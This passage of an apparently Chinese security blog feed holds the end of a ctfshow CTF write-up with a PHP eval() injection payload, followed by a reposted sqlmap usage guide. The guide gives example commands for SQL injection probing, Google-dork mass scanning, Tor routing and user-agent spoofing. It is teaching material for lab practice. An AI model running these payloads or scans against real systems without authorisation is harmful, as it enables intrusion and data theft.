class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$v0</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v2</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v3</span>)) &#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-subst">$v3</span>&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上代码表示只有$v0&#x3D;1，且v2中不能含有分号，v3要有分号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$v0</span> = <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v3</span>);<br></code></pre></td></tr></table></figure><p>在这段代码中只需要v1有数字即可，因为赋值操作的优先级大于and</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-subst">$v3</span>&quot;</span>);<br></code></pre></td></tr></table></figure><p>这段代码会执行括号里的内容，因此我们可以利用括号中的<code>$v2(&#39;ctfshow&#39;)$v3</code>来构造可以输出flag的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//flag in class ctfshow;</span><br></code></pre></td></tr></table></figure><p>由题目中的注释可知flag在ctfshow中，因此我们只需要输出ctfshow即可</p><p>get传参传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022032011.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>本篇文章参考：OWASP（开放式Web应用程序安全项目）</p><blockquote><p><a href="https://owasp.org/Top10/">https://owasp.org/Top10/</a></p></blockquote><blockquote><p>OWASP（开放式Web应用程序安全项目）是一个开放的社区，由非营利组织 OWASP基金会支持的项目。对所有致力于改进应用程序安全的人士开放，旨在提高对应用程序安全性的认识。<br>其最具权威的就是“10项最严重的Web 应用程序安全风险列表” ，总结并更新Web应用程序中最可能、最常见、最危险的十大漏洞，是开发、测试、服务、咨询人员应知应会的知识。<br>最重要的版本<br>应用程序中最严重的十大风险<br>————————————————</p><p><strong>资料：</strong></p><p>通过网盘分享的文件：OWASP代码审计指南v2.0_中文版_刘传兴&amp;孙维康.pdf<br>链接: <a href="https://pan.baidu.com/s/19E7tec4WmZ_IVVkanf3uxQ">https://pan.baidu.com/s/19E7tec4WmZ_IVVkanf3uxQ</a> 提取码: e86b<br>–来自百度网盘超级会员v4的分享</p></blockquote><p><a href="https://www.cnblogs.com/yzloo/p/10391078.html">十大常见web漏洞及防范 - yzloo - 博客园</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞练习，靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap命令详解</title>
    <link href="/2025/11/02/sqlmap%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/11/02/sqlmap%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="sqlmap命令详解"><a href="#sqlmap命令详解" class="headerlink" title="sqlmap命令详解"></a>sqlmap命令详解</h1><blockquote><p>转载自： <a href="https://cloud.tencent.com/developer/user/8223537">全栈程序员站长</a>      原文：<a href="https://cloud.tencent.com/developer/article/2148285">https://cloud.tencent.com/developer/article/2148285</a></p></blockquote><h2 id="0x01-sqlmap-确定目标"><a href="#0x01-sqlmap-确定目标" class="headerlink" title="0x01 sqlmap 确定目标"></a>0x01 sqlmap 确定目标</h2><h3 id="1-1-直连数据库"><a href="#1-1-直连数据库" class="headerlink" title="1.1 直连数据库"></a>1.1 直连数据库</h3><p>sqlmap支持直接连接数据库，通过以下命令来直连</p><p>服务型数据库（前提知道数据库用户名和密码） DBMS:&#x2F;&#x2F;USER:PASSWORD@DBMS_PORT&#x2F;DATABASE_NAME （MySQL，Oracle，Microsoft SQL Server，PostgreSQL，etc）</p><p>例如： python sqlmap.py -d “mysql:&#x2F;&#x2F;admin:<a href="mailto:&#97;&#100;&#x6d;&#x69;&#110;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#49;&#x2e;&#x32;">admin@192.168.1.2</a>:3306&#x2F;security” -f –banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020546.png" alt="img"></p><p>文件型数据库（前提知道数据库的绝对路径） DBMS:&#x2F;&#x2F;DATABASE_FILEPATH (SQLite，Microsoft Access，Fire bird，etc)</p><h3 id="1-2-URL探测"><a href="#1-2-URL探测" class="headerlink" title="1.2 URL探测"></a>1.2 URL探测</h3><p>sqlmap直接对单一URL探测，使用参数 -u 或 –url URL格式：http(s): &#x2F;&#x2F;targeturl [:port] &#x2F;[…]</p><p>例如： python sqlmap.py -u <a href="http://www.target/vuln.php?id=1">http://www.target/vuln.php?id=1</a> –banner</p><h3 id="1-3-文件读取目标"><a href="#1-3-文件读取目标" class="headerlink" title="1.3 文件读取目标"></a>1.3 文件读取目标</h3><p>sqlmap支持从不同类型的文件中读取目标进行SQL注入探测 1、-l 从BurpSuite Proxy或从WebScarab Proxy中读取HTTP请求日志 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020148.png" alt="img"></p><p> 查看burpsuite抓取的日志信息 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020092.png" alt="img"></p><p> 使用sqlmap进行演示 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021326.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020052.png" alt="img"></p><p>2、-x 从sitemap.xml站点地图文件中读取目标探测</p><p>3、-m 从多行文本格式文件读取多个目标</p><p>4、-r 从文本文件中读取HTTP请求作为SQL注入探测目标 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021903.png" alt="img"></p><p> 将burp suite抓取的HTTP请求信息，复制到txt文件中，在使用sqlmap -r ‘txt文件’ 进行探测</p><p>5、-c 从配置文件 sqlmap.conf 中读取目标探测 查看sqlmap.conf 文件的内容 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021918.png" alt="img"></p><p> 将想要探测目标的url填入该文件中，里面也可以通过日志文件形式（相当于使用 -l 参数）、HTTP请求文件（相当于使用 -r 参数）进行探测，还可以设置其他参数，例如：method(HTTP请求方法)、data（指定POST提交的数据）等等</p><p>接下来，我们将目标url填入sqlmap.conf文件，进行演示 python sqlmap.py -c sqlmap.conf –banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020660.png" alt="img"></p><h3 id="1-4-Google-批量扫描注入"><a href="#1-4-Google-批量扫描注入" class="headerlink" title="1.4 Google 批量扫描注入"></a>1.4 Google 批量扫描注入</h3><p>sqlmap通过 -g 自动利用Google获取指定Google hack的目标，然后利用交互向导模式进行SQL注入探测</p><p>例如： python sqlmap.py -g “inurl:.php?id&#x3D;” </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020037.png" alt="img"></p><h2 id="0x02-sqlmap-请求参数设置（一）"><a href="#0x02-sqlmap-请求参数设置（一）" class="headerlink" title="0x02 sqlmap 请求参数设置（一）"></a>0x02 sqlmap 请求参数设置（一）</h2><h3 id="2-1-设置-HTTP-方法"><a href="#2-1-设置-HTTP-方法" class="headerlink" title="2.1 设置 HTTP 方法"></a>2.1 设置 HTTP 方法</h3><p>Sqlmap会自动在探测过程中使用适合的HTTP请求方法。但是在某些具体情况下，需要强制使用具体的HTTP请求方法。例如 PUT请求方法。HTTP PUT请求方法不会自动使用，因此需要我们强制指定。使用 –method&#x3D;PUT。 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021919.png" alt="img"></p><p>例如： python sqlmap.py -u “<a href="http://192.168.1.2/sqlilabs/Less-1/?id=1%E2%80%9D">http://192.168.1.2/sqlilabs/Less-1/?id=1”</a> –method&#x3D;get –banner</p><h3 id="2-2-设置-POST-提交参数"><a href="#2-2-设置-POST-提交参数" class="headerlink" title="2.2 设置 POST 提交参数"></a>2.2 设置 POST 提交参数</h3><p>默认情况下，用于执行HTTP请求的HTTP方法是GET，但是您可以通过提供在POST请求中发送的数据隐式地将其更改为POST。这些数据作为这些参数，被用于SQL注入检测。 例如： python sqlmap.py -u “<a href="http://www.target.com/vuln.php%E2%80%9D">http://www.target.com/vuln.php”</a> –data&#x3D;“id&#x3D;1” -f –banner –dbs –users</p><p>-f fingerprint 指纹</p><p>演示： python sqlmap.py -u “<a href="http://192.168.1.2/sqlilabs/Less-11/%E2%80%9D">http://192.168.1.2/sqlilabs/Less-11/”</a> –data&#x3D;“uname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit” -p uname -f –banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020309.png" alt="img"></p><h3 id="2-3-设置参数分割符"><a href="#2-3-设置参数分割符" class="headerlink" title="2.3 设置参数分割符"></a>2.3 设置参数分割符</h3><p>在某些情况下，sqlmap需要覆盖默认参数分隔符(例如&amp; in GET和POST数据)，才能正确地分割和单独处理每个参数。</p><p>例如： python sqlmap.py -u “<a href="http://www.target.com/vuln.php%E2%80%9D">http://www.target.com/vuln.php”</a> –data&#x3D;“query&#x3D;foobar;id&#x3D;1” –param-del&#x3D;”;” -f –banner –dbs –users</p><p>演示： python sqlmap.py -u “<a href="http://192.168.1.2/sqlilabs/Less-11/%E2%80%9D">http://192.168.1.2/sqlilabs/Less-11/”</a> –data&#x3D;uname&#x3D;“admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit” –param-del&#x3D;”&amp;” -p uname -f –banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020662.png" alt="img"></p><h3 id="2-4-设置Cookie-头"><a href="#2-4-设置Cookie-头" class="headerlink" title="2.4 设置Cookie 头"></a>2.4 设置Cookie 头</h3><p>Sqlmap中用来设置Cookie的参数：–cookie, –cookie-del, –load-cookies –drop-set-cookie </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021972.png" alt="img"></p><p>使用场景： 1、Web应用程序具有基于Cookie验证的过程； 2、想利用Cookie值上的SQL注入漏洞。</p><p>Sqlmap使用Cookie过程： 1、登录或浏览页面。 2、打开审计工具或代理截断，复制Cookie。 3、在Sqlmap中使用 –cookie 粘贴Cookie。 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021255.png" alt="img"></p><p> python sqlmap.py -u “<a href="http://192.168.1.2/sqlilabs/Less-11/%E2%80%9D">http://192.168.1.2/sqlilabs/Less-11/”</a> –data&#x3D;“uname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit” -p uname -f –banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020973.png" alt="img"></p><p>如果在通信过程中，web应用程序使用Set-Cookie标头进行响应，sqlmap将在所有进一步的HTTP请求中自动使用其值作为Cookie标头。sqlmap还将为SQL注入自动测试这些值。这可以通过提供–drop-set-cookie—sqlmap将忽略任何即将到来的Set-Cookie头来避免。 反之亦然，如果您提供了一个带有选项的HTTP Cookie报头—Cookie和目标URL在任何时候发送一个HTTP set -Cookie报头，sqlmap将询问您要为以下HTTP请求使用哪组Cookie。</p><p>load-cookie，可以用来提供包含Netscape&#x2F;wget格式的cookie的特殊文件</p><p>注意：如果需要对HTTP Cookie值进行SQL注入探测，需要设置 –level 2以上（3）。</p><h3 id="2-5-设置-User-Agent-头"><a href="#2-5-设置-User-Agent-头" class="headerlink" title="2.5 设置 User-Agent 头"></a>2.5 设置 User-Agent 头</h3><p>默认情况下， sqlmap使用以下用户代理头值执行HTTP请求: sqlmap&#x2F;1.0-dev-xxxxxxx (<a href="http://sqlmap.org/">http://sqlmap.org</a>) （使用Wireshark 抓包查看） </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020307.png" alt="img"></p><p> 然而， 通过提供自定义用户代理作为选项的参数， 可以使用选项—user-agent来伪造它。（可使用burpsuite抓取正常的HTTP请求包获取User-Agent头的信息）</p><p>sqlmap -u “<a href="http://192.168.1.2/sqlilabs/Less-1/?id=1%E2%80%9D">http://192.168.1.2/sqlilabs/Less-1/?id=1”</a> –user-agent ” Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0″ 再次抓包查看 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022685.png" alt="img"></p><p> 此外， 通过 –random-agent, sqlmap将从.&#x2F;txt&#x2F;user-agent中随机选择一个用于会话中的所有HTTP请求。一些站点在服务端检测HTTP User-Agent值， 如果不是一个合法的值， 就会中断连接。 同时Sqlmap也会曝出错误。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022826.png" alt="img"></p><p> 演示： sqlmap -u “<a href="http://192.168.1.2/sqlilabs/Less-1/?id=1%E2%80%9D">http://192.168.1.2/sqlilabs/Less-1/?id=1”</a> –random-agent 抓包查看 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020339.png" alt="img"></p><p>注意针对User-Agent的值探测SQL注入， 需要设置–level 值为3。或者，使用Burp Suite抓包，将HTTP请求信息复制到txt文件中，然后在要User-Agent头的后面加上一个 * 号，这样不使用—level 3 也能够对User-Agent头进行探测 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022473.png" alt="img"></p><h3 id="2-6-设置-Host-头"><a href="#2-6-设置-Host-头" class="headerlink" title="2.6 设置 Host 头"></a>2.6 设置 Host 头</h3><p>可以手动设置HTTP主机头值。 默认情况下， 从提供的目标URL解析HTTP主机头 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020559.png" alt="img"></p><p> 注意， 如果 –level设置为5,将对HTTP主机头进行SQL注入检测。</p><h3 id="2-7-设置-Referer-头"><a href="#2-7-设置-Referer-头" class="headerlink" title="2.7 设置 Referer 头"></a>2.7 设置 Referer 头</h3><p>伪造HTTP Referer值是可能的。 默认情况下， 如果没有显式设置， HTTP请求中不会发送HTTP引用头。 请注意， 如果–level设置为3或以上， 将针对HTTP引用头 进行SQL注入测试（或在请求信息中要进行探测的位置后面加上*号） </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020440.png" alt="img"></p><h3 id="2-8-设置-额外-HTTP-头"><a href="#2-8-设置-额外-HTTP-头" class="headerlink" title="2.8 设置 额外 HTTP 头"></a>2.8 设置 额外 HTTP 头</h3><p>通过设置选项–header， 可以提供额外的HTTP标头。 每个标头必须用换行符（\n）分隔， 从配置INI文件中提供它们要容易得多。 可以查看示例sqlmap.conf文件。</p><p>例如： python sqlmap.py -u “<a href="http://192.168.21.128/sqlmap/mysql/get_int.php?id=1%E2%80%9D">http://192.168.21.128/sqlmap/mysql/get_int.php?id=1”</a> –headers&#x3D;“Host:<a href="http://www.target.com/nUser-agent:Firefox">www.target.com\nUser-agent:Firefox</a> 1.0” -v 5</p><p>以Sqli-Labs靶场的Sqli-Less1为例 将User-Agent设为：haha 将cookie设为:heihei</p><p>sqlmap -u “<a href="http://192.168.1.2/sqlilabs/Less-1/?id=1%E2%80%9D">http://192.168.1.2/sqlilabs/Less-1/?id=1”</a> –headers&#x3D;“user-agent:haha\ncookie:heihei” </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020619.png" alt="img"></p><h3 id="2-9-设置-HTTP-协议认证"><a href="#2-9-设置-HTTP-协议认证" class="headerlink" title="2.9 设置 HTTP 协议认证"></a>2.9 设置 HTTP 协议认证</h3><p>Sqlmap中设置HTTP协议认证的参数： –auth-type和–auth-cred</p><p>其中–auth-type支持 Basic、 Digest、 NTLM</p><p>–auth-cred认证语法为： username:password （用于需要账号密码登录的页面）</p><p>例如： python sqlmap.py -u “<a href="http://url/arit.php?id=1%E2%80%9D">http://url/arit.php?id=1”</a> –auth-type Basic –auth-cred “testuser:testpass”</p><h3 id="2-10-设置-HTTP-代理"><a href="#2-10-设置-HTTP-代理" class="headerlink" title="2.10 设置 HTTP 代理"></a>2.10 设置 HTTP 代理</h3><p>Sqlmap中设置代理的参数： –proxy, –proxy-cred, –proxy-file ， –ignore-proxy</p><p>其中–proxy用来设置HTTP代理服务器位置 格式： –proxy http(s): &#x2F;&#x2F;ip[:端口]</p><p>–proxy-cred用来设置HTTP代理服务器认证信息 格式： –proxy-cred username:password</p><p>–proxy-file用来设置多条代理在文件中</p><p>–ignore-proxy当您希望通过忽略系统范围内的HTTP(S)代理服务器设置来针对本地网络的目标部分运行sqlmap时， 应该使用这种方法。</p><h2 id="0x03-sqlmap-请求参数设置（二）"><a href="#0x03-sqlmap-请求参数设置（二）" class="headerlink" title="0x03 sqlmap 请求参数设置（二）"></a>0x03 sqlmap 请求参数设置（二）</h2><h3 id="3-1-设置Tor隐藏网络"><a href="#3-1-设置Tor隐藏网络" class="headerlink" title="3.1 设置Tor隐藏网络"></a>3.1 设置Tor隐藏网络</h3><p>Sqlmap中设置Tor网络的参数： –tor –tor-port –tor-type（共有四种类型：HTTP、HTTPS、SOCKS4、SOCKS5） –check-tor</p><h3 id="3-2-设置延时"><a href="#3-2-设置延时" class="headerlink" title="3.2 设置延时"></a>3.2 设置延时</h3><p>Sqlmap探测过程中会发送大量探测Payload到目标， 如果默认情况过快的发包速度回导致目标预警或断开连接。 为了避免这样的情况发生， 可以在探测设置Sqlm1ap发包延迟。 默认情况下， 不设置延迟。 –delay 0.5 设置延迟0.5秒</p><h3 id="3-3-设置超时"><a href="#3-3-设置超时" class="headerlink" title="3.3 设置超时"></a>3.3 设置超时</h3><p>在考虑超时HTTP(S)请求之前， 可以指定等待的秒数。 有效值是一个浮点数， 例如10.5表示10秒半。 默认设置为30秒。 例如： –timeout 10.5</p><h3 id="3-4-设置重传次数"><a href="#3-4-设置重传次数" class="headerlink" title="3.4 设置重传次数"></a>3.4 设置重传次数</h3><p>–retries count 设置对应重试次数， 默认情况下重试3次。（通常与超时参数结合使用）</p><h3 id="3-5-设置随机化参数"><a href="#3-5-设置随机化参数" class="headerlink" title="3.5 设置随机化参数"></a>3.5 设置随机化参数</h3><p>Sqlmap可以指定要在每次请求期间随机更改其值的参数名称。 长度和类型根据提供的原始值保持一直。 –randomize 参数名称</p><p>例如： </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020284.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020240.png" alt="img"></p><h3 id="3-6-设置日志过滤目标"><a href="#3-6-设置日志过滤目标" class="headerlink" title="3.6 设置日志过滤目标"></a>3.6 设置日志过滤目标</h3><p>与使用选项-l使用从提供的日志解析的所有主机不同， 您可以指定有效的Python正则表达式， 用于过滤所需的日志。</p><p>例如： python sqlmap.py -l burp.log –scope&#x3D;”(www)?.target.(com|net|org)”</p><p>–scope&#x3D; ” 正则表达式 “</p><h3 id="3-7-设置忽略-401"><a href="#3-7-设置忽略-401" class="headerlink" title="3.7 设置忽略 401"></a>3.7 设置忽略 401</h3><p>–ignore-401 参数用来忽略未验证错误。</p><p>如果您想测试偶尔返回HTTP错误401(未经授权的)的站点，而您想忽略它并在不提供适当凭证的情况下继续测试，您可以使用–ignore-401</p><h3 id="3-8-设置-HTTP-协议私钥"><a href="#3-8-设置-HTTP-协议私钥" class="headerlink" title="3.8 设置 HTTP 协议私钥"></a>3.8 设置 HTTP 协议私钥</h3><p>当web服务器需要适当的客户端证书和用于<a href="https://cloud.tencent.com/product/faceid?from_column=20065&from=20065">身份验证</a>的私钥时，应该使用此选项。提供的值应该是一个PEM格式的key_file，其中包含证书和私钥。</p><p>–auth-file 文件名</p><h3 id="3-9-设置安全模式"><a href="#3-9-设置安全模式" class="headerlink" title="3.9 设置安全模式"></a>3.9 设置安全模式</h3><p>避免在多次请求失败后销毁会话</p><p>有时，如果执行了一定数量的不成功请求，则在此期间的web应用程序或检查技术会销毁会话。这可能发生在sqlmap的检测阶段或利用任何盲SQL注入类型时。原因是SQL有效负载不一定返回输出，因此可能会向应用程序会话管理或检查技术发出信号。</p><p>–safe-url, –safe-post, –safe-req –safe-freq</p><p>通过这种方式，sqlmap将访问每个预定义数量的请求，而不对某个安全URL执行任何类型的注入。</p><h3 id="3-10-设置忽略URL编码"><a href="#3-10-设置忽略URL编码" class="headerlink" title="3.10 设置忽略URL编码"></a>3.10 设置忽略URL编码</h3><p>据参数的位置(例如GET)，默认情况下它的值可以是URL编码的。在某些情况下，后端web服务器不遵循RFC标准，需要以原始的非编码形式发送值。在这种情况下使用–skip-urlencode。</p><p>–skip-urlencode 不进行URL加密</p><h2 id="0x04-sqlmap-性能优化"><a href="#0x04-sqlmap-性能优化" class="headerlink" title="0x04 sqlmap 性能优化"></a>0x04 sqlmap 性能优化</h2><h3 id="4-1-设置持久-HTTP-连接"><a href="#4-1-设置持久-HTTP-连接" class="headerlink" title="4.1 设置持久 HTTP 连接"></a>4.1 设置持久 HTTP 连接</h3><p>Sqlmap中可以设置连接为持久连接。 HTTP报文中设置 Connection: Keep-Alive。（通过减少连接次数来提升性能） 参数： –keep-alive 注意该参数与 -proxy参数不兼容 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022449.png" alt="img"></p><p><img src="https://ask.qcloudimg.com/http-save/yehe-8223537/8ebeb446b4b0bc8fb88b0ec56e7f5048.png" alt="img"></p><h3 id="4-2-设置-HTTP-空连接"><a href="#4-2-设置-HTTP-空连接" class="headerlink" title="4.2 设置 HTTP 空连接"></a>4.2 设置 HTTP 空连接</h3><p>Sqlmap中设置空连接， 表示直接获得HTTP响应的大小而不用获得HTTP响应体。 常用在盲注判断真&#x2F;假中，降低网络带宽消耗。 参数： –null-connection 注意这个参数，与–text-only参数不兼容 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020235.png" alt="img"></p><h3 id="4-3-设置多线程"><a href="#4-3-设置多线程" class="headerlink" title="4.3 设置多线程"></a>4.3 设置多线程</h3><p>Sqlmap中设置同时发送多少个HTTP请求的多线程。</p><p>–threads 默认是1个线程。 为了不影响目标站点服务器的性能， Sqlmap可以设置最大的线程数为10。</p><h3 id="4-5-设置预测输出"><a href="#4-5-设置预测输出" class="headerlink" title="4.5 设置预测输出"></a>4.5 设置预测输出</h3><p>Sqlmap中的预测输出， 在推理算法中用于检索值字符的顺序统计预测。 参数： –predict-output</p><p>注意这个参数与 –thread参数不兼容。</p><p><em><strong>使用 -o 参数可开启前面三个性能参数（–keep-alive 、–null-connection 、 –predict-output），不开启 –threads参数</strong></em></p><h2 id="0x05-sqlmap-注入位置介绍"><a href="#0x05-sqlmap-注入位置介绍" class="headerlink" title="0x05 sqlmap 注入位置介绍"></a>0x05 sqlmap 注入位置介绍</h2><h3 id="5-0-注入介绍"><a href="#5-0-注入介绍" class="headerlink" title="5.0 注入介绍"></a>5.0 注入介绍</h3><p>所谓SQL注入， 就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串， 最终达到欺骗服务器执行恶意的SQL命令。 具体来说， 它是利用现有应用程序， 将（恶意的） SQL命令注入到后台数据库引擎执行的能力， 它可以通过在Web表单中输入（恶意） SQL语句得到一个存在安全漏洞的网站上的数据库， 而不是按照设计者意图去执行SQL语句。</p><p>由此可见： SQL注入发生位置 HTTP数据包中任意位置</p><h3 id="5-1-设置指定注入参数"><a href="#5-1-设置指定注入参数" class="headerlink" title="5.1 设置指定注入参数"></a>5.1 设置指定注入参数</h3><p>Sqlmap测试参数 -p, –skip –param-exclude –skip-static</p><p>-p ： 指定具体探测的参数。 例如： -p “id,user-agent”</p><p>–skip： 忽略探测具体的参数。 例如： –level –skip “user-agent,referer”</p><p>–param-exclude： 忽略包含具体内容的参数。 例如： –param-exclude&#x3D;“token|session” 不对包含token或session的参数进行探测。</p><p>–skip-static： 忽略非动态参数</p><h3 id="5-2-设置URL注入位置"><a href="#5-2-设置URL注入位置" class="headerlink" title="5.2 设置URL注入位置"></a>5.2 设置URL注入位置</h3><p>当注入点位于URL本身内部时， 会出现一些特殊情况。 除非手动指向URL路径， 否则sqlmap不会对URL路径执行任何自动测试。 必须在命令行中添加星号(*)来指定这些注入点。</p><p>例如， 当使用Apache web服务器的mod_rewrite模块或其他类似的技术时， 这就显得特别有用了</p><p>python sqlmap.py -u <a href="http://targeturl/param1/value1*/param2/value2/">http://targeturl/param1/value1*/param2/value2/</a></p><h3 id="5-3-设置任意注入位置"><a href="#5-3-设置任意注入位置" class="headerlink" title="5.3 设置任意注入位置"></a>5.3 设置任意注入位置</h3><p>与URL注入点类似， 星号(*)(注意:这里也支持Havij样式%INJECT %)也可以用来指向GET、POST或HTTP头中的任意注入点。 注入点可以通过在带有选项-u的GET参数值、 带有选项–data数据的POST参数值、 带有选项-H的HTTP（header）头值、 带有选项-A的User_Agent头、 用户代理、 引用和&#x2F;或cookie的HTTP头值中指定， 或者在带有选项-r的文件中加载的HTTP请求的通用位置指定。</p><p>python sqlmap.py -u “<a href="http://targeturl”/">http://targeturl”</a> –cookie&#x3D;”param1&#x3D;value1*;param2&#x3D;value2</p><h2 id="0x06-sqlmap-注入参数"><a href="#0x06-sqlmap-注入参数" class="headerlink" title="0x06 sqlmap 注入参数"></a>0x06 sqlmap 注入参数</h2><h3 id="6-1-强制设置-DBMS"><a href="#6-1-强制设置-DBMS" class="headerlink" title="6.1 强制设置 DBMS"></a>6.1 强制设置 DBMS</h3><p>默认情况下Sqlmap会自动识别探测目标Web应用程序的后端<a href="https://cloud.tencent.com/product/dmc?from_column=20065&from=20065">数据库管理</a>系统（DBMS） ， 以下列出</p><p>Sqlmap完全支持的DBMS种类：</p><p>Mysql、 Oracle、 Microsoft SQL Server、 IBM DB2、 SQLite、 Firebird、 Sybase、 SAP MaxDB、HSQLDB、 Informix</p><p>–dbms 数据库管理系统名称 [版本号]</p><p>例如： –dbms mysql 5.0 、 –dbms microsoft sql server 05</p><h3 id="6-2-强制设置-OS"><a href="#6-2-强制设置-OS" class="headerlink" title="6.2 强制设置 OS"></a>6.2 强制设置 OS</h3><p>默认情况下Sqlmap会自动识别探测目标Web应用程序的后端操作系统（OS） ， 以下列出Sqlmap完全支持的OS种类。 Linux 、 Windows</p><p>请注意， 此选项不是强制性的， 强烈建议只在完全确定底层操作系统的后端数据库管理系统时才使用它。 如果不知道它， 让sqlmap自动为您识别它。 例如： –os windows 或 –os linux</p><p>请注意， 此选项不是强制性的， 强烈建议只在完全确定底层操作系统的后端数据库管理系统时才使用它。 如果不知道它， 让sqlmap自动为您识别它。</p><h3 id="6-3-关闭负载转换机制"><a href="#6-3-关闭负载转换机制" class="headerlink" title="6.3 关闭负载转换机制"></a>6.3 关闭负载转换机制</h3><p>在检索结果时， sqlmap使用一种机制， 在这种机制中， 所有条目都被转换为字符串类型， 并在NULL值的情况下用空格字符替换。 这样做是为了防止出现任何错误状态(例如， 将空值与字符串值连接起来)， 并简化数据检索过程本身。 尽管如此， 还是有报告的案例(例如MySQL DBMS的旧版本)由于数据检索本身的问题(例如没有返回值)需要关闭这种机制(使用此开关)。</p><p>–no-cast</p><h3 id="6-4-关闭字符转义机制"><a href="#6-4-关闭字符转义机制" class="headerlink" title="6.4 关闭字符转义机制"></a>6.4 关闭字符转义机制</h3><p>在sqlmap需要在有效负载中使用(单引号分隔)字符串值(例如， 选择’foobar’)时， 这些值将自动转义(例如， 选择CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114))。这样做的原因有两个:混淆有效负载内容和防止后端服务器上查询转义机制(例如magic_quotes和&#x2F;或mysql_real_escape_string)的潜在问题。 用户可以使用这个开关关闭它(例如减少有效负载大小)。</p><p>–no-escape（一般不建议关闭）</p><h3 id="6-5-强制设置无效值替换"><a href="#6-5-强制设置无效值替换" class="headerlink" 